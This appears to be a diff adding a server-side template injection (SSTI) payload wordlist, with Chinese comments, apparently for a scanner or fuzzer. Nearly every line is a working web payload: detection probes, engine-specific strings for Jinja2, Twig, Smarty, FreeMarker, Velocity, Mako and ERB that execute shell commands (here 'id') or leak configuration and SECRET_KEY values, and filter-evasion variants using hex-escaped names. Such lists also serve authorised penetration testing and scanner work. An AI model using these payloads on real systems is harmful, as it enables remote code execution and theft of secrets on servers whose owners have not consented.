@@ -1,0 +1,63 @@
+# SSTI Payload 字典
+# 格式：每行一个 payload，# 开头为注释
+
+# ── 通用检测 ──
+{{7*7}}
+{7*7}
+${7*7}
+#{7*7}
+*{7*7}
+<%= 7*7 %>
+{{7*'7'}}
+${{"a".toUpperCase()}}
+${{7*7}}
+[[7*7]]
+[(7*7)]
+
+# ── Jinja2 (Python) ──
+{{config}}
+{{config.items()}}
+{{settings.SECRET_KEY}}
+{{self.__dict__}}
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()")}}{%endif%}{%endfor%}
+
+# ── Twig (PHP) ──
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+{{['id']|map('system')|join}}
+
+# ── Smarty (PHP) ──
+{php}echo `id`;{/php}
+{system('id')}
+{php}system('id');{/php}
+
+# ── FreeMarker (Java) ──
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+
+# ── Velocity (Java) ──
+#set($e="e")
+$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")
+
+# ── Mako (Python) ──
+${__import__('os').popen('id').read()}
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+
+# ── ERB (Ruby) ──
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').read() %>
+
+# ── 绕过过滤 ──
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+{{''.join(["os",".","po","pen"])}}
